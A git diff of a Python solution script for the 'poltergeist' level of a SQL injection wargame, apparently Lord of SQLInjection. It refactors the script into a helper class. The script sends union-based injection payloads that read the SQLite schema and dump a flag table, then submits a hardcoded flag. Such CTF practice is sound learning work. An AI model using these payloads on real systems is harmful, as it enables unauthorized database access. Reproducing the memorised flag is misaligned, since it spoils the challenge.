@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
@@ -26,25 +27,23 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
 
-    param = dict(
-        pw="' union select sql from sqlite_master order by 1 desc--")
-    response = los.get_request(url, param, cook)
+    payload = "' union select sql from sqlite_master order by 1 desc--"
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    response = p.my_request()
+    print('')
 
-    print(response)
+    p.payload = "' union select * from flag_70c81d99--"
+    response = p.my_request()
+    print('')
 
-    param = dict(
-        pw="' union select * from flag_70c81d99--")
-    response = los.get_request(url, param, cook)
-
-    print(response)
-
-    param = dict(pw='FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}')
-    response = los.get_request(url, param, cook)
-
+    p.payload = 'FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}'
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Poltergeist Clear!')
+        print('\nPoltergeist Clear!')
 
 
 if __name__ == '__main__':
